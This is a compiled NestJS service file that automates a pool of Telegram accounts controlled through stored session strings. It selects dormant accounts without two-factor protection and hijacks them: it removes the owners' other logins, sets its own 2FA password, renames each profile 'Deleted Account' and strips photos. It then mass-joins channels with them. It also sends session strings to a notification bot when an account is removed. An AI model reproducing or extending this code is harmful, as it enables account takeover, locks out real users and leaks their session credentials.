"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var BufferClientService_1;
Object.defineProperty(exports, "__esModule", { value: true });
exports.BufferClientService = void 0;
const channels_service_1 = require("./../channels/channels.service");
const common_1 = require("@nestjs/common");
const mongoose_1 = require("@nestjs/mongoose");
const mongoose_2 = require("mongoose");
const Telegram_service_1 = require("../Telegram/Telegram.service");
const Helpers_1 = require("telegram/Helpers");
const users_service_1 = require("../users/users.service");
const active_channels_service_1 = require("../active-channels/active-channels.service");
const client_service_1 = require("../clients/client.service");
const promote_client_service_1 = require("../promote-clients/promote-client.service");
const parseError_1 = require("../../utils/parseError");
const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
const logbots_1 = require("../../utils/logbots");
const connection_manager_1 = require("../Telegram/utils/connection-manager");
const session_manager_1 = require("../session-manager");
let BufferClientService = BufferClientService_1 = class BufferClientService {
    constructor(bufferClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, promoteClientService, sessionService) {
        this.bufferClientModel = bufferClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
        this.channelsService = channelsService;
        this.promoteClientService = promoteClientService;
        this.sessionService = sessionService;
        this.logger = new common_1.Logger(BufferClientService_1.name);
        this.joinChannelMap = new Map();
        this.leaveChannelMap = new Map();
        this.isJoinChannelProcessing = false;
        this.isLeaveChannelProcessing = false;
        this.JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000;
        this.LEAVE_CHANNEL_INTERVAL = 60 * 1000;
        this.LEAVE_CHANNEL_BATCH_SIZE = 10;
    }
    async onModuleDestroy() {
        this.logger.log('Cleaning up BufferClientService resources');
        this.clearBufferMap();
        this.clearLeaveMap();
    }
    async create(bufferClient) {
        const newUser = new this.bufferClientModel({
            ...bufferClient,
            status: bufferClient.status || 'active',
        });
        return newUser.save();
    }
    async findAll(status) {
        const filter = status ? { status } : {};
        return this.bufferClientModel.find(filter).exec();
    }
    async findOne(mobile, throwErr = true) {
        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return user;
    }
    async update(mobile, updateClientDto) {
        const updatedUser = await this.bufferClientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true, returnDocument: 'after' }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
        }
        return updatedUser;
    }
    async createOrUpdate(mobile, createOrUpdateUserDto) {
        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            console.log("Updating");
            return this.update(existingUser.mobile, createOrUpdateUserDto);
        }
        else {
            console.log("creating");
            return this.create({ ...createOrUpdateUserDto, status: createOrUpdateUserDto.status || 'active' });
        }
    }
    async remove(mobile) {
        try {
            const bufferClient = await this.findOne(mobile, false);
            if (!bufferClient) {
                throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
            }
            this.logger.log(`Removing BufferClient with mobile: ${mobile}`);
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}\nsession: ${bufferClient.session}`)}`);
            await this.bufferClientModel.deleteOne({ mobile }).exec();
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error);
            this.logger.error(`Error removing BufferClient with mobile ${mobile}: ${errorDetails.message}`);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
        this.logger.log(`BufferClient with mobile ${mobile} removed successfully`);
    }
    async search(filter) {
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        if (filter.status) {
            filter.status = filter.status;
        }
        return this.bufferClientModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.bufferClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    removeFromBufferMap(key) {
        this.joinChannelMap.delete(key);
    }
    clearBufferMap() {
        console.log("BufferMap cleared");
        this.joinChannelMap.clear();
        this.clearJoinChannelInterval();
    }
    async updateStatus(mobile, status, message) {
        const updateData = { status };
        if (message) {
            updateData.message = message;
        }
        return this.update(mobile, updateData);
    }
    async markAsInactive(mobile, reason) {
        return this.updateStatus(mobile, 'inactive', reason);
    }
    async updateInfo() {
        const clients = await this.bufferClientModel.find({
            status: 'active'
        }).sort({ channels: 1 });
        for (const client of clients) {
            const mobile = client.mobile;
            try {
                this.logger.debug(`Updating info for client: ${mobile}`);
                const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                const channels = await telegramClient.channelInfo(true);
                this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);
                await this.update(mobile, { channels: channels.ids.length });
                await connection_manager_1.connectionManager.unregisterClient(mobile);
                await (0, Helpers_1.sleep)(2000);
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                await this.markAsInactive(mobile, `${errorDetails.message}`);
                this.logger.error(`Error updating info for client ${client.mobile}:`, errorDetails);
            }
        }
    }
    async joinchannelForBufferClients(skipExisting = true) {
        if (this.telegramService.getActiveClientSetup()) {
            this.logger.warn('Ignored active check buffer channels as active client setup exists');
            return 'Active client setup exists, skipping buffer promotion';
        }
        this.logger.log('Starting join channel process for buffer clients');
        this.joinChannelMap.clear();
        this.leaveChannelMap.clear();
        this.clearJoinChannelInterval();
        this.clearLeaveChannelInterval();
        await (0, Helpers_1.sleep)(2000);
        const existingKeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
        const clients = await this.bufferClientModel.find({
            channels: { $lt: 350 },
            mobile: { $nin: existingKeys }
        }).sort({ channels: 1 }).limit(8);
        this.logger.debug(`Found ${clients.length} buffer clients to process`);
        const joinSet = new Set();
        const leaveSet = new Set();
        let successCount = 0;
        let failCount = 0;
        for (const document of clients) {
            const mobile = document.mobile;
            this.logger.debug(`Processing buffer client: ${mobile}`);
            try {
                const client = await connection_manager_1.connectionManager.getClient(mobile, {
                    autoDisconnect: false,
                    handler: false
                });
                const channels = await client.channelInfo(true);
                this.logger.debug(`Client ${mobile} has ${channels.ids.length} existing channels`);
                await this.update(mobile, { channels: channels.ids.length });
                if (channels.canSendFalseCount < 10) {
                    const excludedIds = channels.ids;
                    const result = channels.ids.length < 220
                        ? await this.channelsService.getActiveChannels(150, 0, excludedIds)
                        : await this.activeChannelsService.getActiveChannels(150, 0, excludedIds);
                    if (!this.joinChannelMap.has(mobile)) {
                        this.joinChannelMap.set(mobile, result);
                        joinSet.add(mobile);
                        this.logger.debug(`Added ${result.length} channels to join queue for ${mobile}`);
                    }
                    else {
                        this.logger.debug(`${mobile}: Already present in join map, skipping`);
                    }
                }
                else {
                    if (!this.leaveChannelMap.has(mobile)) {
                        this.leaveChannelMap.set(mobile, channels.canSendFalseChats);
                        leaveSet.add(mobile);
                        this.logger.warn(`Client ${mobile} has ${channels.canSendFalseChats.length} restricted channels, added to leave queue`);
                    }
                    else {
                        this.logger.debug(`${mobile}: Already present in leave map, skipping`);
                    }
                }
                successCount++;
            }
            catch (error) {
                failCount++;
                const errorDetails = (0, parseError_1.parseError)(error);
                const errorMsg = errorDetails?.message || error?.errorMessage || 'Unknown error';
                const isFatal = [
                    "SESSION_REVOKED",
                    "AUTH_KEY_UNREGISTERED",
                    "USER_DEACTIVATED",
                    "USER_DEACTIVATED_BAN"
                ].includes(errorMsg);
                if (isFatal) {
                    this.logger.error(`Session invalid for ${mobile} due to ${errorMsg}, removing client`);
                    try {
                        await this.remove(mobile);
                    }
                    catch (removeErr) {
                        this.logger.error(`Failed to remove client ${mobile}:`, removeErr);
                    }
                }
                else {
                    this.logger.warn(`Transient error for ${mobile}: ${errorMsg}`);
                }
            }
            finally {
                connection_manager_1.connectionManager.unregisterClient(mobile);
            }
            await (0, Helpers_1.sleep)(2000);
        }
        if (joinSet.size > 0) {
            this.logger.debug(`Starting join queue for ${joinSet.size} buffer clients`);
            this.joinChannelQueue();
        }
        if (leaveSet.size > 0) {
            this.logger.debug(`Starting leave queue for ${leaveSet.size} buffer clients`);
            this.leaveChannelQueue();
        }
        this.logger.log(`Join process complete — Success: ${successCount}, Fail: ${failCount}`);
        return `Buffer Join queued for: ${joinSet.size}, Leave queued for: ${leaveSet.size}`;
    }
    async joinChannelQueue() {
        this.logger.debug('Attempting to start join channel queue');
        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {
            this.logger.warn('Join channel process is already running');
            return;
        }
        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, not starting queue');
            return;
        }
        this.isJoinChannelProcessing = true;
        this.joinChannelIntervalId = setInterval(async () => {
            let processTimeout;
            try {
                const keys = Array.from(this.joinChannelMap.keys());
                if (keys.length === 0) {
                    this.clearJoinChannelInterval();
                    return;
                }
                processTimeout = setTimeout(() => {
                    this.logger.error('Join channel interval processing timeout');
                    this.clearJoinChannelInterval();
                }, this.JOIN_CHANNEL_INTERVAL - 1000);
                this.logger.debug(`Processing join channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.joinChannelIntervalId}`);
                for (const mobile of keys) {
                    let currentChannel = null;
                    try {
                        const channels = this.joinChannelMap.get(mobile);
                        if (!channels || channels.length === 0) {
                            this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);
                            this.removeFromBufferMap(mobile);
                            continue;
                        }
                        currentChannel = channels.shift();
                        this.logger.debug(`${mobile} has ${channels.length} pending channels to join`);
                        this.joinChannelMap.set(mobile, channels);
                        const client = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                        this.logger.debug(`${mobile} attempting to join channel: @${currentChannel.username}`);
                        await this.telegramService.tryJoiningChannel(mobile, currentChannel);
                    }
                    catch (error) {
                        const errorDetails = (0, parseError_1.parseError)(error, `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Outer Err ERR: `, false);
                        this.logger.error(`Error joining channel for ${mobile}: ${error.message}`);
                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {
                            this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);
                            this.removeFromBufferMap(mobile);
                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                            await this.update(mobile, { channels: channelsInfo.ids.length });
                        }
                        if (error.errorMessage === "SESSION_REVOKED" ||
                            error.errorMessage === "AUTH_KEY_UNREGISTERED" ||
                            error.errorMessage === "USER_DEACTIVATED" ||
                            error.errorMessage === "USER_DEACTIVATED_BAN" ||
                            error.errorMessage === "FROZEN_METHOD_INVALID") {
                            this.logger.error(`Session invalid for ${mobile}, removing client`);
                            this.removeFromBufferMap(mobile);
                            await this.remove(mobile);
                        }
                    }
                    finally {
                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                    }
                }
            }
            catch (error) {
                this.logger.error('Error in join channel interval', error);
                this.clearJoinChannelInterval();
            }
            finally {
                if (processTimeout) {
                    clearTimeout(processTimeout);
                }
            }
        }, this.JOIN_CHANNEL_INTERVAL);
        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);
    }
    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);
            clearInterval(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
            this.isJoinChannelProcessing = false;
            if (this.joinChannelMap.size > 0) {
                setTimeout(() => {
                    this.logger.debug('Triggering next join channel process');
                    this.joinchannelForBufferClients(false);
                }, 30000);
            }
        }
    }
    removeFromLeaveMap(key) {
        this.leaveChannelMap.delete(key);
        if (this.leaveChannelMap.size === 0) {
            this.clearLeaveChannelInterval();
        }
    }
    clearLeaveMap() {
        console.log("LeaveMap cleared");
        this.leaveChannelMap.clear();
        this.clearLeaveChannelInterval();
    }
    async leaveChannelQueue() {
        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {
            this.logger.warn('Leave channel process is already running');
            return;
        }
        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, not starting queue');
            return;
        }
        this.isLeaveChannelProcessing = true;
        this.leaveChannelIntervalId = setInterval(async () => {
            let processTimeout;
            try {
                const keys = Array.from(this.leaveChannelMap.keys());
                if (keys.length === 0) {
                    this.logger.debug('Leave map is empty, clearing interval');
                    this.clearLeaveChannelInterval();
                    return;
                }
                processTimeout = setTimeout(() => {
                    this.logger.error('Leave channel interval processing timeout');
                    this.clearLeaveChannelInterval();
                }, this.LEAVE_CHANNEL_INTERVAL - 1000);
                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);
                for (const mobile of keys) {
                    try {
                        const channels = this.leaveChannelMap.get(mobile);
                        if (!channels || channels.length === 0) {
                            this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);
                            this.removeFromLeaveMap(mobile);
                            continue;
                        }
                        const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);
                        this.logger.debug(`${mobile} has ${channels.length} pending channels to leave`);
                        if (channels.length > 0) {
                            this.leaveChannelMap.set(mobile, channels);
                        }
                        else {
                            this.removeFromLeaveMap(mobile);
                        }
                        const client = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                        this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);
                        await client.leaveChannels(channelsToProcess);
                        this.logger.debug(`${mobile} left channels successfully`);
                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                    }
                    catch (error) {
                        const errorDetails = (0, parseError_1.parseError)(error, `${mobile} Leave Channel ERR: `, false);
                        if (errorDetails.message === "SESSION_REVOKED" ||
                            errorDetails.message === "AUTH_KEY_UNREGISTERED" ||
                            errorDetails.message === "USER_DEACTIVATED" ||
                            errorDetails.message === "USER_DEACTIVATED_BAN") {
                            this.logger.error(`Session invalid for ${mobile}, removing client`);
                            await this.remove(mobile);
                            this.removeFromLeaveMap(mobile);
                        }
                        try {
                            await connection_manager_1.connectionManager.unregisterClient(mobile);
                        }
                        catch (unregisterError) {
                            this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);
                        }
                    }
                }
            }
            catch (error) {
                this.logger.error('Error in leave channel interval', error);
                this.clearLeaveChannelInterval();
            }
            finally {
                if (processTimeout) {
                    clearTimeout(processTimeout);
                }
            }
        }, this.LEAVE_CHANNEL_INTERVAL);
        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);
    }
    clearLeaveChannelInterval() {
        if (this.leaveChannelIntervalId) {
            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);
            clearInterval(this.leaveChannelIntervalId);
            this.leaveChannelIntervalId = null;
        }
        this.isLeaveChannelProcessing = false;
        this.logger.debug('Leave channel interval cleared and processing flag reset');
    }
    async setAsBufferClient(mobile, availableDate = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]) {
        const user = (await this.usersService.search({ mobile }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false);
        if (isExist) {
            throw new common_1.ConflictException('BufferClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map(client => client?.mobile);
        const allPromoteMobiles = [];
        for (const client of clients) {
            const clientPromoteMobiles = await this.clientService.getPromoteMobiles(client.clientId);
            allPromoteMobiles.push(...clientPromoteMobiles);
        }
        if (!allPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {
            try {
                const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false });
                await telegramClient.set2fa();
                await (0, Helpers_1.sleep)(15000);
                await telegramClient.updateUsername('');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updatePrivacyforDeletedAccount();
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true);
                const bufferClient = {
                    tgId: user.tgId,
                    session: user.session,
                    mobile: user.mobile,
                    availableDate,
                    channels: channels.ids.length,
                    status: 'active',
                };
                await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, errorDetails.status);
            }
            await connection_manager_1.connectionManager.unregisterClient(mobile);
            return "Client set as buffer successfully";
        }
        else {
            throw new common_1.BadRequestException("Number is a Active Client");
        }
    }
    async checkBufferClients() {
        if (this.telegramService.getActiveClientSetup()) {
            this.logger.warn("Ignored active check buffer channels as active client setup exists");
            return;
        }
        await (0, Helpers_1.sleep)(2000);
        const bufferclients = await this.findAll('active');
        const badIds = [];
        let goodIds = [];
        if (bufferclients.length < 80) {
            for (let i = 0; i < 80 - bufferclients.length; i++) {
                badIds.push(i.toString());
            }
        }
        const clients = await this.clientService.findAll();
        const promoteclients = await this.promoteClientService.findAll();
        const clientMainMobiles = clients.map(c => c.mobile);
        const allPromoteMobiles = [];
        for (const client of clients) {
            const clientPromoteMobiles = await this.clientService.getPromoteMobiles(client.clientId);
            allPromoteMobiles.push(...clientPromoteMobiles);
        }
        const clientIds = [...clientMainMobiles, ...allPromoteMobiles].filter(Boolean);
        const promoteclientIds = promoteclients.map(c => c.mobile);
        const today = new Date().toISOString().split('T')[0];
        const toProcess = bufferclients.filter(doc => !clientIds.includes(doc.mobile) &&
            !promoteclientIds.includes(doc.mobile));
        const parallelLimit = 4;
        for (let i = 0; i < toProcess.length; i += parallelLimit) {
            const chunk = toProcess.slice(i, i + parallelLimit);
            const results = await Promise.allSettled(chunk.map(doc => this.processBufferClient(doc, badIds, goodIds)));
            await (0, Helpers_1.sleep)(2000);
        }
        for (const doc of bufferclients) {
            if (clientIds.includes(doc.mobile) || promoteclientIds.includes(doc.mobile)) {
                this.logger.warn("Number is an Active Client");
                goodIds.push(doc.mobile);
                await this.remove(doc.mobile);
            }
        }
        goodIds = [...new Set([...goodIds, ...clientIds, ...promoteclientIds])];
        this.logger.debug(`GoodIds: ${goodIds.length}, BadIds: ${badIds.length}`);
        await this.addNewUserstoBufferClients(badIds, goodIds);
    }
    async processBufferClient(doc, badIds, goodIds) {
        try {
            const cli = await connection_manager_1.connectionManager.getClient(doc.mobile, { autoDisconnect: true, handler: false });
            try {
                const me = await cli.getMe();
                if (me.username) {
                    await this.telegramService.updateUsername(doc.mobile, '');
                    await (0, Helpers_1.sleep)(2000);
                }
                if (me.firstName !== "Deleted Account") {
                    await this.telegramService.updateNameandBio(doc.mobile, 'Deleted Account', '');
                    await (0, Helpers_1.sleep)(2000);
                }
                await this.telegramService.deleteProfilePhotos(doc.mobile);
                const hasPassword = await cli.hasPassword();
                if (!hasPassword) {
                    this.logger.warn("Client does not have password");
                    badIds.push(doc.mobile);
                }
                else {
                    this.logger.debug(doc.mobile + " : ALL Good");
                    goodIds.push(doc.mobile);
                }
            }
            catch (innerError) {
                this.logger.error(`Error processing client ${doc.mobile}: ${innerError.message}`);
                badIds.push(doc.mobile);
                await this.remove(doc.mobile);
            }
            finally {
                await connection_manager_1.connectionManager.unregisterClient(doc.mobile);
            }
            await (0, Helpers_1.sleep)(2000);
        }
        catch (error) {
            this.logger.error(`Error with client ${doc.mobile}: ${error.message}`);
            (0, parseError_1.parseError)(error);
            badIds.push(doc.mobile);
            await this.remove(doc.mobile);
            try {
                await connection_manager_1.connectionManager.unregisterClient(doc.mobile);
            }
            catch (unregisterError) {
                this.logger.error(`Error unregistering client ${doc.mobile}: ${unregisterError.message}`);
            }
        }
    }
    async addNewUserstoBufferClients(badIds, goodIds) {
        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
        const documents = await this.usersService.executeQuery({
            mobile: { $nin: goodIds },
            expired: false,
            twoFA: false,
            lastActive: { $lt: sixMonthsAgo },
            totalChats: { $gt: 150 }
        }, { tgId: 1 }, badIds.length + 3);
        this.logger.debug(`New buffer documents to be added: ${documents.length}`);
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            if (!document || !document.mobile || !document.tgId || !document.session) {
                this.logger.warn('Invalid document found, skipping');
                continue;
            }
            try {
                const client = await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: false });
                try {
                    const hasPassword = await client.hasPassword();
                    this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        this.logger.debug("Waiting for setting 2FA");
                        await (0, Helpers_1.sleep)(30000);
                        await client.updateUsername('');
                        await (0, Helpers_1.sleep)(3000);
                        await client.updatePrivacyforDeletedAccount();
                        await (0, Helpers_1.sleep)(3000);
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await (0, Helpers_1.sleep)(3000);
                        await client.deleteProfilePhotos();
                        await (0, Helpers_1.sleep)(2000);
                        await this.telegramService.removeOtherAuths(document.mobile);
                        const channels = await client.channelInfo(true);
                        this.logger.debug("Creating buffer client document");
                        const bufferClient = {
                            tgId: document.tgId,
                            session: document.session,
                            mobile: document.mobile,
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                            status: 'active',
                        };
                        await this.create(bufferClient);
                        await this.usersService.update(document.tgId, { twoFA: true });
                        this.logger.debug("=============Created BufferClient=============");
                        badIds.pop();
                    }
                    else {
                        this.logger.debug(`Failed to Update as BufferClient as ${document.mobile} already has Password`);
                        await this.usersService.update(document.tgId, { twoFA: true });
                    }
                }
                catch (error) {
                    this.logger.error(`Error processing client ${document.mobile}: ${error.message}`);
                    (0, parseError_1.parseError)(error);
                }
                finally {
                    try {
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                    }
                    catch (unregisterError) {
                        this.logger.error(`Error unregistering client ${document.mobile}: ${unregisterError.message}`);
                    }
                }
            }
            catch (error) {
                this.logger.error(`Error creating client connection for ${document.mobile}: ${error.message}`);
                (0, parseError_1.parseError)(error);
            }
        }
        setTimeout(() => {
            this.logger.log('Starting next join channel process');
            this.joinchannelForBufferClients();
        }, 2 * 60 * 1000);
    }
};
exports.BufferClientService = BufferClientService;
exports.BufferClientService = BufferClientService = BufferClientService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('bufferClientModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => promote_client_service_1.PromoteClientService))),
    __param(7, (0, common_1.Inject)((0, common_1.forwardRef)(() => session_manager_1.SessionService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        client_service_1.ClientService,
        channels_service_1.ChannelsService,
        promote_client_service_1.PromoteClientService,
        session_manager_1.SessionService])
], BufferClientService);
//# sourceMappingURL=buffer-client.service.js.map